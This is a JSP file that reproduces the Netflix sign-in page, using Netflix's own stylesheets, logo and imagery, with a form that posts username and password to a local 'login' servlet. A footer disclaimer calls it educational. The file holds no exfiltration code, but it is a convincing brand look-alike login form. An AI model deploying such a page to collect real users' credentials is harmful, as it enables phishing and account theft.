<%@ page contentType="text/html; charset=UTF-8" pageEncoding="UTF-8" %>
<!doctype html>
<html>
<head>
    <title>Netflix</title>
    <link type="text/css" rel="stylesheet" href="https://assets.nflxext.com/web/ffe/wp/less/login/loginBase.561a17471287f0c631cb.css"/>
    <link type="text/css" rel="stylesheet" href="https://assets.nflxext.com/web/ffe/wp/less/pages/login/Login.5a283c4238c477bd3995.css"/>
</head>

<body>
<%-- BEGIN NETFLIX SOURCE CODE --%>
<div id="appMountPoint">
    <div class="login-wrapper hybrid-login-wrapper">
        <div class="login-wrapper-background"><img class="concord-img vlv-creative" src="https://assets.nflxext.com/ffe/siteui/vlv3/0ef67cc5-0aa7-47cf-87bd-7f595afc7cfb/728618d9-9274-46ab-9850-1015ff9c05df/US-en-20221107-popsignuptwoweeks-perspective_alpha_website_small.jpg" alt="" />
        </div>
        <div class="nfHeader login-header signupBasicHeader"><a href="/" class="svg-nfLogo signupBasicHeader"><svg viewBox="0 0 111 30" class="svg-icon svg-icon-netflix-logo" aria-hidden="true" focusable="false"><g id="netflix-logo"><path d="M105.06233,14.2806261 L110.999156,30 C109.249227,29.7497422 107.500234,29.4366857 105.718437,29.1554972 L102.374168,20.4686475 L98.9371075,28.4375293 C97.2499766,28.1563408 95.5928391,28.061674 93.9057081,27.8432843 L99.9372012,14.0931671 L94.4680851,-5.68434189e-14 L99.5313525,-5.68434189e-14 L102.593495,7.87421502 L105.874965,-5.68434189e-14 L110.999156,-5.68434189e-14 L105.06233,14.2806261 Z M90.4686475,-5.68434189e-14 L85.8749649,-5.68434189e-14 L85.8749649,27.2499766 C87.3746368,27.3437061 88.9371075,27.4055675 90.4686475,27.5930265 L90.4686475,-5.68434189e-14 Z M81.9055207,26.93692 C77.7186241,26.6557316 73.5307901,26.4064111 69.250164,26.3117443 L69.250164,-5.68434189e-14 L73.9366389,-5.68434189e-14 L73.9366389,21.8745899 C76.6248008,21.9373887 79.3120255,22.1557784 81.9055207,22.2804387 L81.9055207,26.93692 Z M64.2496954,10.6561065 L64.2496954,15.3435186 L57.8442216,15.3435186 L57.8442216,25.9996251 L53.2186709,25.9996251 L53.2186709,-5.68434189e-14 L66.3436123,-5.68434189e-14 L66.3436123,4.68741213 L57.8442216,4.68741213 L57.8442216,10.6561065 L64.2496954,10.6561065 Z M45.3435186,4.68741213 L45.3435186,26.2498828 C43.7810479,26.2498828 42.1876465,26.2498828 40.6561065,26.3117443 L40.6561065,4.68741213 L35.8121661,4.68741213 L35.8121661,-5.68434189e-14 L50.2183897,-5.68434189e-14 L50.2183897,4.68741213 L45.3435186,4.68741213 Z M30.749836,15.5928391 C28.687787,15.5928391 26.2498828,15.5928391 24.4999531,15.6875059 L24.4999531,22.6562939 C27.2499766,22.4678976 30,22.2495079 32.7809542,22.1557784 L32.7809542,26.6557316 L19.812541,27.6876933 L19.812541,-5.68434189e-14 L32.7809542,-5.68434189e-14 L32.7809542,4.68741213 L24.4999531,4.68741213 L24.4999531,10.9991564 C26.3126816,10.9991564 29.0936358,10.9054269 30.749836,10.9054269 L30.749836,15.5928391 Z M4.78114163,12.9684132 L4.78114163,29.3429562 C3.09401069,29.5313525 1.59340144,29.7497422 0,30 L0,-5.68434189e-14 L4.4690224,-5.68434189e-14 L10.562377,17.0315868 L10.562377,-5.68434189e-14 L15.2497891,-5.68434189e-14 L15.2497891,28.061674 C13.5935889,28.3437998 11.906458,28.4375293 10.1246602,28.6868498 L4.78114163,12.9684132 Z" id="Fill-14"></path></g></svg><span class="screen-reader-text">Netflix Home</span></a>
        </div>
        <div class="login-body">
            <div>
                <div class="login-content login-form hybrid-login-form hybrid-login-form-signup">

                    <div class="hybrid-login-form-main">
                        <h1>Sign In</h1>

                        <%-- BEGIN NETFLIX & CUSTOM CODE SERVLET HANDLER --%>
                        <form method="POST" class="login-form" action="login">
                            <div class="nfInput nfEmailPhoneInput login-input login-input-email">
                                <div class="nfInputPlacement">
                                    <div class="nfEmailPhoneControls">
                                        <label class="input_id">
                                            <input type="text" name="username" class="nfTextField" id="username"/>
                                            <label for="username" class="placeLabel">Username</label>
                                        </label>
                                    </div>
                                </div>
                            </div>

                            <div class="nfInput nfPasswordInput login-input login-input-password">
                                <div class="nfInputPlacement">
                                    <div class="nfPasswordControls">
                                        <label class="input_id">
                                            <input type="password" name="password" class="nfTextField" id="password"/>
                                            <label for="password" class="placeLabel">Password</label>
                                        </label>
                                    </div>
                                </div>
                            </div>

                            <button class="btn login-button btn-submit btn-small" name="login" value="processLogin" type="submit">Sign In</button>
                            <%-- END NETFLIX & CUSTOM CODE SERVLET HANDLER --%>

                            <div class="hybrid-login-form-help">
                                <div class="ui-binary-input login-remember-me">
                                    <input type="checkbox" name="rememberMe" id="bxid_rememberMe_true" value="true" checked=""/>
                                    <label for="bxid_rememberMe_true"><span class="login-remember-me-label-text">Remember me</span></label>
                                </div>
                            </div>
                        </form>
                    </div>
                    <div class="hybrid-login-form-other">
                        <div class="recaptcha-terms-of-use">
                            <p><span>This page is protected by Google reCAPTCHA to ensure you&#x27;re not a bot.</span> <button class="recaptcha-terms-of-use--link-button">Learn more.</button></p>
                            <div class="recaptcha-terms-of-use--disclosure"><span>The information collected by Google reCAPTCHA is subject to the Google <a href='https://policies.google.com/privacy' id='recaptcha-privacy-link' target='_blank'>Privacy Policy</a> and <a href='https://policies.google.com/terms' id='recaptcha-tos-link' target='_blank'>Terms of Service</a>, and is used for providing, maintaining, and improving the reCAPTCHA service and for general security purposes (it is not used for personalized advertising by Google).</span>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>

        <div class="site-footer-wrapper centered">
            <div class="footer-divider"></div>
            <div class="site-footer">
                <p class="footer-top"><a class="footer-top-a"></a></p>

                <ul class="footer-links structural">
                    <p class="footer-top">Netflix, this is for educational purposes, don't sue me plz. <a href="https://www.netflix.com/"><br>Click for real Netflix.</a></p>
                    <li class="footer-link-item footer-link-do-not-sell-info"><a class="footer-link"></a></li>
                </ul>

                <div class="lang-selection-container" id="lang-switcher">
                    <div class="ui-select-wrapper"><label for="lang-switcher-select" class="ui-label"><span class="ui-label-text">Select Language</span></label>
                        <div class="select-arrow medium prefix globe"><select class="ui-select medium" id="lang-switcher-select" tabindex="0"><option selected="" lang="en" value="/" data-language="en" data-country="US">English</option><option lang="es" value="/us-es/" data-language="es" data-country="US">Español</option></select></div>
                    </div>
                </div>
            </div>
        </div>
    </div>
</div>
<%-- END NETFLIX SOURCE CODE --%>
</body>
</html>